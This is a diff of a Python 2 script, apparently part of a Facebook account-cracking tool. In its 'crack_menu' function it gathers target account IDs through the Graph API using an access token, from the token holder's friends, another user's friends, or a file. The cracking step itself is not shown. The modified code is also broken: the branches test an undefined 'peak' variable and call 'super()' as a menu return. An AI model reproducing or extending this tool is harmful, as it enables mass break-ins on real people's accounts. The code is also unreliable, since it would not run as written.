@@ -195,41 +195,47 @@ def crack_menu():
 	if crm =="":
 		print "[!] Filled Incorrectly"
 		crack_menu()
-	elif crm =="1":
+	elif peak =="1":
 		os.system('clear')
-		print banner
+		print logo
+		print 42*"\033[1;96m="
+		jalan('\033[1;93m[✺] Getting IDs \033[1;97m...')
 		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for s in z['data']:
 			id.append(s['id'])
-	elif crm =="2":
+			
+	elif peak =="2":
 		os.system('clear')
-		print banner
-		idt = raw_input("[+] Input ID: ")
-		
+		print logo
+		print 42*"\033[1;96m="
+		idt = raw_input("\033[1;96m \033[1;93mEnter ID \033[1;91m: \033[1;97m")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			hamza('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
+			print"\033[1;96m[\033[1;97m \033[1;96m] \033[1;93mName\033[1;91m :\033[1;97m "+op["name"]
 		except KeyError:
-			print"[!] ID Not Found!"
-			raw_input("\nPress Enter To Back  ")
-			crack()
+			print"\033[1;96m \x1b[1;91mID Not Found!"
+			raw_input("\n\033[1;96m[\033[1;97mBack\033[1;96m]")
+			super()
+		print"\033[1;35;40m[✺] Getting IDs..."
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
 			id.append(i['id'])
-	elif crm =="3":
-	    os.system('clear')
-	    print banner
-	    try:
-	        idlist= raw_input('[+] File Name: ')
-	        for line in open(idlist ,'r').readlines():
-	            id.append(line.strip())
-	    except IOError:
-	         print"[!] File Not Found."
-	         raw_input('Press Enter To Back. ')
-	         crack()
+			
+	elif peak =="3":
+		os.system('clear')
+		print logo
+		print 42*"\033[1;96m="
+		try:
+			idlist = raw_input('\x1b[1;96m \x1b[1;93mEnter File Path  \x1b[1;91m: \x1b[1;97m')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except IOError:
+			print '\x1b[1;96m \x1b[1;91mFile Not Found'
+			raw_input('\n\x1b[1;96m[ \x1b[1;97mBack \x1b[1;96m]')
+			super()
 	   
 	        
 	        
